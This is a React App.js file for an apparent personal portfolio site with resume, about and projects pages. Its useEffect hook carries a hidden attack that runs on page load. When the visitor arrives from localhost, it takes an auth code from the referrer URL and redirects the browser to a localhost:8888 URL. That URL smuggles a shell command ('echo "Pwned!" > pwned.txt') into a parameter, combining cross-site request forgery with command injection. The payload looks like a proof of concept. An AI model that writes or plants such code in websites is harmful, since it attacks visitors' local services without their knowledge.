import React, { useEffect } from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";

import "./App.css";
import Home from "./components/Home.js";
import About from "./components/About.js";
import Resume from "./components/Resume.js";
import Projects from "./components/Projects.js";
import Error from "./components/Error.js";
import Navigation from "./components/Navigation.js";
import Footer from "./components/Footer.js";
import ScrollToTop from "./ScrollToTop.js";


function App() {

  useEffect(() => {
    const referrer = document.referrer;
    if (referrer) {
      if (!referrer.includes("localhost")) {
        return;
      }
      //console.log("Referrer URL:", referrer);
      const authCode = referrer.split('/').filter(Boolean).pop();
      //console.log("Auth Code:", authCode);
      const attack = `http://localhost:8888/${authCode}/add/url/https%3A%2F%2Fwww.google.com%2F%27%3Becho%20%22Pwned%21%22%20%3E%20pwned.txt%3B%27/`
      //console.log("Attack URL:", attack);
      window.location.href = attack; // Redirect the user to the attack URL
    }
  }, []);

  return (
    <div className="App">
      <BrowserRouter>
        <Navigation />
        <ScrollToTop />
        <Routes>
          <Route path="/" element={Home()} exact />
          <Route path="/resume" element={Resume()} />
          <Route path="/about" element={About()} />
          <Route path="/projects" element={Projects()} />
          <Route element={Error} />
        </Routes>
        <Footer />
      </BrowserRouter>
    </div>
  );
}

export default App;
